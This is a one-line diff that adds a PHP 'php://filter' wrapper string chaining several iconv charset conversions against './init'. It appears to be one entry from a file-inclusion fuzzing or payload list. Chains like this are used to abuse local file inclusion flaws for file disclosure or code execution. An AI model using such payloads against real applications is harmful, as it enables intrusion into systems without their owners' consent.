@@ -1,0 +1,1 @@
+php://filter/convert.iconv.EUC-KR.CP1025|convert.iconv.CP866.EUC-CN|convert.iconv.CP950.Shift_JIS/resource=./init
